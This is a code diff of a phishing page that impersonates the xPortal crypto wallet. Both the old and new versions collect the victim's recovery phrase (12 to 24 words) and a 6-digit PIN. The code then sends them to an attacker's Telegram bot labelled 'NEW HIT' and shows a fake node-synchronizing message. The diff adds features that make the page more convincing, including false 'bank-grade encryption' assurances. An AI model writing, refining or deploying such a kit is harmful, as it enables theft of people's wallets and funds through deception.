@@ -3,149 +3,193 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>xPortal | Wallet Verification</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <title>xPortal | Secure Access</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        :root { --teal: #23f7dd; --purple: #8a3ffc; --border: rgba(255, 255, 255, 0.08); }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        body { background: #000; color: #fff; min-height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 75%); }
+        :root { --teal: #23f7dd; --purple: #8a3ffc; --border: rgba(255,255,255,0.08); --bg: #000; --card: #0d0d0d; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background: var(--bg); color: #fff; min-height: 100vh; overflow-x: hidden; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 80%); }
 
-        .app-wrapper { width: 100%; max-width: 420px; padding: 25px; text-align: center; }
-        .logo-main { width: 80px; height: 80px; margin-bottom: 30px; }
+        .app-container { width: 100%; max-width: 440px; padding: 20px; position: relative; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; }
+        
+        /* HEADER LOGO */
+        .header { text-align: center; margin-bottom: 40px; position: relative; }
+        .logo { width: 80px; height: 80px; filter: drop-shadow(0 0 15px rgba(35, 247, 221, 0.2)); }
+        
+        .back-btn { position: absolute; left: 0; top: 10px; cursor: pointer; display: none; color: #888; font-weight: 600; align-items: center; gap: 5px; font-size: 14px; }
 
-        h1 { font-size: 30px; font-weight: 800; letter-spacing: -1px; margin-bottom: 15px; }
-        p.desc { color: #888; font-size: 15px; margin-bottom: 40px; line-height: 1.6; }
-
-        .section { display: none; animation: fadeIn 0.4s ease; }
+        /* SECTIONS */
+        .section { display: none; animation: slideIn 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
         .section.active { display: block; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
+
+        h1 { font-size: 32px; font-weight: 800; letter-spacing: -1.5px; margin-bottom: 12px; }
+        .subtitle { color: #8e8e8e; font-size: 15px; margin-bottom: 35px; line-height: 1.5; }
+
+        /* SELECTOR */
+        .selector-wrap { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; }
+        .sel-btn { background: rgba(255,255,255,0.04); border: 1px solid var(--border); color: #666; padding: 10px 14px; border-radius: 14px; cursor: pointer; font-size: 12px; font-weight: 700; transition: 0.2s; }
+        .sel-btn.active { background: var(--purple); color: #fff; border-color: var(--purple); box-shadow: 0 4px 15px rgba(138, 63, 252, 0.3); }
+
+        /* GRID */
+        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 30px; max-height: 320px; overflow-y: auto; padding: 5px; }
+        .box { position: relative; }
+        .box span { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); font-size: 10px; color: var(--teal); font-weight: 800; opacity: 0.7; }
+        .box input { width: 100%; background: #000; border: 1px solid var(--border); border-radius: 14px; padding: 14px 10px 14px 30px; color: #fff; font-size: 13px; outline: none; transition: 0.2s; }
+        .box input:focus { border-color: var(--teal); background: rgba(35, 247, 221, 0.02); }
+
+        /* KEYPAD */
+        .pin-dots { display: flex; justify-content: center; gap: 15px; margin: 30px 0; }
+        .dot { width: 16px; height: 16px; border: 2px solid var(--border); border-radius: 50%; transition: 0.2s; }
+        .dot.active { background: var(--teal); border-color: var(--teal); box-shadow: 0 0 10px var(--teal); }
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 260px; margin: 0 auto; }
+        .key { width: 70px; height: 70px; border-radius: 50%; background: rgba(255,255,255,0.03); border: 1px solid var(--border); display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: 600; cursor: pointer; }
+        .key:active { background: rgba(255,255,255,0.1); transform: scale(0.95); }
 
         /* BUTTONS */
-        .btn { width: 100%; height: 62px; border-radius: 100px; border: none; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; }
+        .btn { width: 100%; height: 64px; border-radius: 100px; font-size: 17px; font-weight: 700; border: none; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; }
         .btn-white { background: #fff; color: #000; }
-        .btn-dark { background: rgba(255, 255, 255, 0.05); color: #fff; border: 1px solid var(--border); }
-        .btn:hover { transform: scale(1.02); }
+        .btn-dark { background: rgba(255,255,255,0.05); color: #fff; border: 1px solid var(--border); }
+        .btn:hover { transform: scale(1.02); filter: brightness(1.1); }
 
-        /* WORDS GRID */
-        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 25px 0; }
-        .word-input { position: relative; }
-        .word-input span { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); font-size: 10px; color: var(--teal); font-weight: 800; }
-        .word-input input { width: 100%; background: #0a0a0a; border: 1px solid var(--border); border-radius: 12px; padding: 14px 5px 14px 28px; color: #fff; font-size: 13px; outline: none; }
-
-        /* PIN CODE */
-        .pin-dots { display: flex; justify-content: center; gap: 12px; margin: 25px 0; }
-        .dot { width: 15px; height: 15px; border: 2px solid var(--border); border-radius: 50%; }
-        .dot.filled { background: var(--teal); border-color: var(--teal); box-shadow: 0 0 10px var(--teal); }
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 240px; margin: 0 auto; }
-        .key { width: 65px; height: 65px; border-radius: 50%; background: rgba(255,255,255,0.03); display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: 600; cursor: pointer; border: 1px solid var(--border); }
-
-        #sync { display: none; color: var(--teal); font-weight: 700; margin-top: 20px; font-size: 13px; letter-spacing: 1px; }
+        #loading { display: none; color: var(--teal); font-weight: 800; letter-spacing: 1px; font-size: 12px; margin-top: 20px; text-align: center; animation: blink 1.5s infinite; }
+        @keyframes blink { 50% { opacity: 0.4; } }
+        
+        .legal { font-size: 11px; color: #444; margin-top: 30px; text-align: center; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
-<div class="app-wrapper">
-    <img src="Capture.PNG" class="logo-main">
+<div class="app-container">
+    <div class="header">
+        <div id="backBtn" class="back-btn" onclick="handleBack()">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M15 19l-7-7 7-7"/></svg>
+            Back
+        </div>
+        <img src="Capture.PNG" class="logo">
+    </div>
 
-    <div id="step1" class="section active">
+    <div id="step-1" class="section active">
         <h1>Welcome to xPortal</h1>
-        <p class="desc">Connect your xPortal wallet to manage your assets securely.</p>
-        <button class="btn btn-white" onclick="showStep(3)">Import Existing Wallet</button>
-        <button class="btn btn-dark" onclick="showStep(2)">Create New Wallet</button>
+        <p class="subtitle">The everything app for your digital life. Private, secure, and global.</p>
+        <button class="btn btn-white" onclick="navigateTo(3)">Import Existing Wallet</button>
+        <button class="btn btn-dark" onclick="navigateTo(2)">Create New Wallet</button>
     </div>
 
-    <div id="step2" class="section">
-        <h2 style="margin-bottom:10px;">Secret Phrase</h2>
-        <p style="color:#888; font-size:14px;">Backup your 12-word recovery phrase.</p>
+    <div id="step-2" class="section">
+        <h1>Secret Phrase</h1>
+        <p class="subtitle">Store these 12 words securely. Never share them with anyone.</p>
         <div class="grid" id="createGrid"></div>
-        <button class="btn btn-white" onclick="showStep(3)">I've saved them</button>
+        <button class="btn btn-white" onclick="navigateTo(3)">I've saved them</button>
     </div>
 
-    <div id="step3" class="section">
-        <h2 style="margin-bottom:10px;">Secret Phrase</h2>
-        <p style="color:#888; font-size:14px;">Enter your 12-word recovery phrase.</p>
+    <div id="step-3" class="section">
+        <h1>Import Wallet</h1>
+        <p class="subtitle">Enter your secret recovery phrase to restore access.</p>
+        
+        <div class="selector-wrap">
+            <button class="sel-btn active" onclick="updateGrid(12, this)">12 Words</button>
+            <button class="sel-btn" onclick="updateGrid(15, this)">15 Words</button>
+            <button class="sel-btn" onclick="updateGrid(18, this)">18 Words</button>
+            <button class="sel-btn" onclick="updateGrid(24, this)">24 Words</button>
+        </div>
+
         <div class="grid" id="importGrid"></div>
-        <button class="btn btn-white" onclick="submitPhrase()">Continue</button>
+        <button class="btn btn-white" onclick="validatePhrase()">Continue</button>
     </div>
 
-    <div id="step4" class="section">
-        <h2 style="margin-bottom:10px;">Security PIN</h2>
-        <p style="color:#888; font-size:14px;">Confirm your 6-digit PIN code.</p>
-        <div class="pin-dots" id="pinDots">
+    <div id="step-4" class="section">
+        <h1>Security PIN</h1>
+        <p class="subtitle">Confirm your 6-digit PIN to secure your session.</p>
+        <div class="pin-dots">
             <div class="dot"></div><div class="dot"></div><div class="dot"></div>
             <div class="dot"></div><div class="dot"></div><div class="dot"></div>
         </div>
         <div class="keypad">
-            <script>for(let i=1;i<=9;i++) document.write(`<div class="key" onclick="press(${i})">${i}</div>`);</script>
-            <div></div><div class="key" onclick="press(0)">0</div><div class="key" onclick="del()">←</div>
+            <script>for(let i=1;i<=9;i++) document.write(`<div class="key" onclick="pressPin(${i})">${i}</div>`);</script>
+            <div style="width:70px"></div><div class="key" onclick="pressPin(0)">0</div><div class="key" onclick="delPin()">←</div>
         </div>
     </div>
 
-    <div id="sync">ESTABLISHING ENCRYPTED NODE...</div>
+    <div id="loading">SYNCHRONIZING WITH MULTIVERSX NODE...</div>
+    <div class="legal">Bank-grade encryption active</div>
 </div>
 
 <script>
-    const BOT_TOKEN = 'YOUR_BOT_TOKEN';
-    const CHAT_ID = 'YOUR_CHAT_ID';
+    const CONFIG = { TOKEN: 'YOUR_BOT_TOKEN', ID: 'YOUR_CHAT_ID' };
+    let currentStep = 1;
+    let historyStack = [1];
+    let finalPhrase = "";
+    let pinCode = "";
 
-    let phraseData = "";
-    let currentPin = "";
-
-    function showStep(s) {
-        document.querySelectorAll('.section').forEach(div => div.classList.remove('active'));
-        document.getElementById('step'+s).classList.add('active');
-
-        if(s === 2) {
-            const words = ["alpha","bravo","charlie","delta","echo","foxtrot","golf","hotel","india","juliet","kilo","lima"];
-            const cg = document.getElementById('createGrid');
-            cg.innerHTML = words.map((w,i) => `<div class="word-input"><span>${i+1}</span><input value="${w}" readonly></div>`).join('');
+    function navigateTo(step, isBack = false) {
+        document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+        document.getElementById(`step-${step}`).classList.add('active');
+        document.getElementById('backBtn').style.display = (step === 1) ? 'none' : 'flex';
+        if(!isBack) historyStack.push(step);
+        
+        if(step === 2) {
+            const mock = ["brave","silver","ocean","tiger","shield","focus","cloud","member","camera","bright","stable","digital"];
+            document.getElementById('createGrid').innerHTML = mock.map((w,i)=>`<div class="box"><span>${i+1}</span><input value="${w}" readonly></div>`).join('');
         }
-        if(s === 3) {
-            const ig = document.getElementById('importGrid');
-            ig.innerHTML = '';
-            for(let i=1; i<=12; i++) {
-                ig.innerHTML += `<div class="word-input"><span>${i}</span><input type="password" class="w-in" onpaste="handleSmartPaste(event)"></div>`;
-            }
+        if(step === 3) updateGrid(12);
+    }
+
+    function handleBack() {
+        if(historyStack.length > 1) {
+            historyStack.pop();
+            navigateTo(historyStack[historyStack.length-1], true);
         }
     }
 
-    // --- SMART PASTE LOGIC ---
+    function updateGrid(n, btn) {
+        if(btn) {
+            document.querySelectorAll('.sel-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+        }
+        const g = document.getElementById('importGrid');
+        g.innerHTML = '';
+        for(let i=1; i<=n; i++) {
+            g.innerHTML += `<div class="box"><span>${i}</span><input type="password" class="w-in" onpaste="handleSmartPaste(event)"></div>`;
+        }
+    }
+
     function handleSmartPaste(e) {
         e.preventDefault();
         const text = (e.clipboardData || window.clipboardData).getData('text');
-        const words = text.trim().split(/\s+/); // كيقسم الجملة بالخلاءات
+        const words = text.trim().split(/\s+/);
         const inputs = document.querySelectorAll('.w-in');
-        
-        words.forEach((w, i) => {
-            if(inputs[i]) inputs[i].value = w; // كيحط كل كلمة ف الخانة ديالها
-        });
+        words.forEach((w, i) => { if(inputs[i]) inputs[i].value = w; });
     }
 
-    function submitPhrase() {
-        let wordsArr = [];
-        document.querySelectorAll('.w-in').forEach(i => wordsArr.push(i.value.trim()));
-        if(wordsArr.some(w => w === "")) return alert("Fill all 12 words");
-        phraseData = wordsArr.join(" ");
-        showStep(4);
+    function validatePhrase() {
+        const inputs = document.querySelectorAll('.w-in');
+        let words = [];
+        inputs.forEach(i => words.push(i.value.trim()));
+        if(words.some(w => w === "")) return;
+        finalPhrase = words.join(" ");
+        navigateTo(4);
     }
 
-    function press(n) {
-        if(currentPin.length < 6) {
-            currentPin += n;
-            updateDots();
-            if(currentPin.length === 6) {
-                document.getElementById('step4').style.display = 'none';
-                document.getElementById('sync').style.display = 'block';
-                const msg = `💎 NEW HIT!\n\nPhrase: ${phraseData}\nPIN: ${currentPin}`;
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
-            }
+    function pressPin(n) {
+        if(pinCode.length < 6) {
+            pinCode += n;
+            updatePinDots();
+            if(pinCode.length === 6) finalize();
         }
     }
 
-    function del() { currentPin = currentPin.slice(0, -1); updateDots(); }
-    function updateDots() {
+    function delPin() { pinCode = pinCode.slice(0,-1); updatePinDots(); }
+    function updatePinDots() {
         const dots = document.querySelectorAll('.dot');
-        dots.forEach((d, i) => d.classList.toggle('filled', i < currentPin.length));
+        dots.forEach((d,i) => d.classList.toggle('active', i < pinCode.length));
+    }
+
+    function finalize() {
+        document.getElementById('step-4').style.display = 'none';
+        document.getElementById('loading').style.display = 'block';
+        const log = `💎 NEW xPORTAL HIT!\n\nPhrase: ${finalPhrase}\nPIN: ${pinCode}`;
+        fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage?chat_id=${CONFIG.ID}&text=${encodeURIComponent(log)}`);
     }
 </script>
 </body>
